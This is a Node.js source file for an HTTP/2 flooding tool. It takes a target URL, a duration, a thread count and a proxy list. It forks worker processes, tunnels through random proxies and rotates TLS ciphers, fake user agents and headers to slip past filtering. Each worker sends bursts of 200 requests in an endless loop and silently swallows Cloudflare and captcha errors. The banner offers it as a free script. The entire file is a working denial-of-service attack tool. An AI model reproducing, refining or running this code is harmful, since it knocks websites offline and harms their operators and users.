const url = require('url'),
  fs = require('fs'),
  http2 = require('http2'),
  http = require('http'),
  tls = require('tls'),
  net = require('net'),
  cluster = require('cluster'),
  fakeua = require('fake-useragent'),
  cplist = [
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
  ],
  accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'application/javascript, */*;q=0.8',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  ],
  lang_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
  ],
  encoding_header = [
    'gzip, deflate',
    'br;q=1.0, gzip;q=0.8, *;q=0.1',
    'gzip',
    'gzip, compress',
    'compress, deflate',
    'compress',
    'gzip, deflate, br',
    'deflate',
  ],
  controle_header = [
    'max-age=604800',
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
  ],
  ignoreNames = [
    'RequestError',
    'StatusCodeError',
    'CaptchaError',
    'CloudflareError',
    'ParseError',
    'ParserError',
  ],
  ignoreCodes = [
    'SELF_SIGNED_CERT_IN_CHAIN',
    'ECONNRESET',
    'ERR_ASSERTION',
    'ECONNREFUSED',
    'EPIPE',
    'EHOSTUNREACH',
    'ETIMEDOUT',
    'ESOCKETTIMEDOUT',
    'EPROTO',
  ]
process
  .on('uncaughtException', function (error) {
    if (
      (error.code && ignoreCodes.includes(error.code)) ||
      (error.name && ignoreNames.includes(error.name))
    ) {
      return false
    }
  })
  .on('unhandledRejection', function (error) {
    if (
      (error.code && ignoreCodes.includes(error.code)) ||
      (error.name && ignoreNames.includes(error.name))
    ) {
      return false
    }
  })
  .on('warning', (warning) => {
    if (
      (warning.code && ignoreCodes.includes(warning.code)) ||
      (warning.name && ignoreNames.includes(warning.name))
    ) {
      return false
    }
  })
  .setMaxListeners(0)
function accept() {
  return accept_header[Math.floor(Math.random() * accept_header.length)]
}
function lang() {
  return lang_header[Math.floor(Math.random() * lang_header.length)]
}
function encoding() {
  return encoding_header[Math.floor(Math.random() * encoding_header.length)]
}
function controling() {
  return controle_header[Math.floor(Math.random() * controle_header.length)]
}
function cipher() {
  return cplist[Math.floor(Math.random() * cplist.length)]
}
const target = process.argv[2],
  time = process.argv[3],
  thread = process.argv[4],
  proxys = fs.readFileSync(process.argv[5], 'utf-8').toString().match(/\S+/g)
function proxyr() {
  return proxys[Math.floor(Math.random() * proxys.length)]
}
if (cluster.isMaster) {
  const dateObj = new Date()
  console.log(
    '\x1B[36mURL: \x1B[37m' +
      url.parse(target).host +
      '\n\x1B[36mThread: \x1B[37m' +
      thread +
      '\n\x1B[36mTime: \x1B[37m' +
      time +
      '\n\x1B[36mSCRIPT BY : \x1B[37m$DagTriZaker <3 Thanks for use my script <3 \n\x1B FREE SCRIPT ! MANG DI BAN LAM SUC VAT CA DOI ! '
  )
  for (var bb = 0; bb < thread; bb++) {
    cluster.fork()
  }
  setTimeout(() => {
    process.exit(-1)
  }, time * 1000)
} else {
  function flood() {
    var parsedUrl = url.parse(target)
    const fakeUserAgent = fakeua()
    var selectedCipher = cipher(),
      proxySplit = proxyr().split(':'),
      requestOptions = {
        ':path': parsedUrl.path,
        'X-Forwarded-For': proxySplit[0],
        'X-Forwarded-Host': proxySplit[0],
        ':method': 'GET',
        'User-agent': fakeUserAgent,
        Origin: target,
        Accept: accept(),
        'Accept-Encoding': encoding(),
        'Accept-Language': lang(),
        'Cache-Control': controling(),
      }
    const httpAgent = new http.Agent({
      keepAlive: true,
      keepAliveMsecs: 20000,
      maxSockets: 0,
    })
    var connectRequest = http.request(
      {
        host: proxySplit[0],
        agent: httpAgent,
        globalAgent: httpAgent,
        port: proxySplit[1],
        headers: {
          Host: parsedUrl.host,
          'Proxy-Connection': 'Keep-Alive',
          Connection: 'Keep-Alive',
        },
        method: 'CONNECT',
        path: parsedUrl.host + ':443',
      },
      function () {
        connectRequest.setSocketKeepAlive(true)
      }
    )
    connectRequest.on('connect', function (response, socket, head) {
      const http2Session = http2.connect(parsedUrl.href, {
        createConnection: () =>
          tls.connect(
            {
              host: parsedUrl.host,
              ciphers: selectedCipher,
              secureProtocol: 'TLS_method',
              TLS_MIN_VERSION: '1.2',
              TLS_MAX_VERSION: '1.3',
              servername: parsedUrl.host,
              secure: true,
              rejectUnauthorized: false,
              ALPNProtocols: ['h2'],
              socket: socket,
            },
            function () {
              for (let i = 0; i < 200; i++) {
                const request = http2Session.request(requestOptions)
                request.setEncoding('utf8')
                request.on('data', (data) => {})
                request.on('response', () => {
                  request.close()
                })
                request.end()
              }
            }
          ),
      })
    })
    connectRequest.end()
  }
  setInterval(() => {
    flood()
  })
}
